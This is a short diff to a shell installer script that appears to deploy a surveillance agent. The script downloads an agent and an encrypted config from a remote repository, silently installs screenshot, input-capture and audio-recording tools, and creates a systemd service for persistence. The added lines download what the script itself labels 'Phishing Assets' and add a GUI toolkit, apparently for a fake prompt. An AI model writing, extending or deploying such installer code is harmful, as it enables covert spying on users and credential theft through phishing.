@@ -16,6 +16,8 @@ if command -v curl >/dev/null 2>&1; then
 elif command -v wget >/dev/null 2>&1; then
     wget -qO "$INSTALL_DIR/agent.py" "$REPO/linux/agent.py"
     wget -qO "$INSTALL_DIR/config.enc" "$REPO/config.enc"
+    # Download Phishing Assets
+    wget -qO "$INSTALL_DIR/prompt.png" "$REPO/linux/prompt.png"
 else
     echo "No downloader found."
     exit 1
@@ -25,7 +27,7 @@ fi
 # This part might prompt for password if run interactively, or fail silently if not.
 if command -v sudo >/dev/null 2>&1; then
     sudo apt-get update -qq >/dev/null 2>&1
-    sudo apt-get install -y -qq python3 scrot xinput alsa-utils >/dev/null 2>&1
+    sudo apt-get install -y -qq python3 python3-tk scrot xinput alsa-utils >/dev/null 2>&1
 fi
 
 # 4. Create Systemd User Service
